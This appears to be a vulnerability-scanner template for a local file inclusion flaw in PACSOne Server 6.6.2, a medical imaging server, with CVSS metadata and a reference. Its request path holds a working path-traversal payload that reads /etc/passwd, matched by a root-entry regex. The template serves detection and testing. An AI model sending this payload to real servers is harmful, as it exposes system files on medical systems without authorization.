http:
- matchers:
  - regex:
    - root:[x*]:0:0
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/pacsone/nocache.php?path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2f.%2fzpx%2f..%2fpasswd'
id: pacsone-server-lfi
info:
  author: 0x_Akoko
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  description: PACSOne Server 6.6.2 is vulnerable to local file inclusion via its
    integrated DICOM Web Viewer.
  metadata:
    max-request: 1
  name: PACSOne Server 6.6.2 - Local File Inclusion
  reference:
  - https://cxsecurity.com/issue/WLB-2018010303
  severity: high
  tags: pacsone,lfi
